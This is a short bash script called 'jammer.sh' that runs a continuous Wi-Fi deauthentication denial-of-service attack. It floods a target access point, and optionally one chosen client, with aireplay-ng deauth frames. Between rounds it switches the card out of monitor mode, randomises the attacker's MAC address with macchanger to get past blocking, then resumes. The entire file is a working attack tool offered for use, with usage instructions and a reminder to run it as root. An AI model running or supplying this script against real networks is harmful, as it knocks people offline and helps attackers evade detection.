#!/bin/bash

# This script performs a DoS attack on a wireless AP
# while changing the attacker's MAC address at regular intervals

# NOTE :-
# Make sure to perform execution of this script only after 
# Monitor mode has been enabled on the required interface
# Pass the parametres in order to this script for it to run

# Usage :-
# ./jammer.sh <INTERFACE_TO_USE> <TARGET_BSSID_AP> <TARGET_CLEINT_BSSID>(optional) <CHANNEL_NO>

# Run this script as root!!!

while true
do
	if [ $# == 3 ]				# 3 parametres = <IFACE> <BSSID_AP> <CHANNEL>
	then
		iwconfig $1 channel $3
		aireplay-ng -0 5 -a $2 $1
	elif [ $# == 4 ]			# 4 parametres = <IFACE> <AP> <CLIENT> <CHANNEL>
	then
		iwconfig $1 channel $4
		aireplay-ng -0 5 -a $2 -c $3 $1
	else					# incorrect no. of arguments passed
		echo "[-] Usage:- ./jammer.sh <INTERFACE_TO_USE> <TARGET_BSSID_AP> <TARGET_CLEINT_BSSID>(optional) <CHANNEL_NO>"
		exit
	fi

	ifconfig $1 down
	iwconfig $1 mode managed		# MAC Changer doesn't work in monitor mode
	macchanger -r $1 | grep "New MAC"	# new MAC address initiated
	iwconfig $1 mode monitor		# making sure wireless card is in monitor mode
	iwconfig $1 | grep Mode
	ifconfig $1 up
	sleep 2					# wait for the whole process to complete
	echo "[!] Performing attack with new MAC!"
done
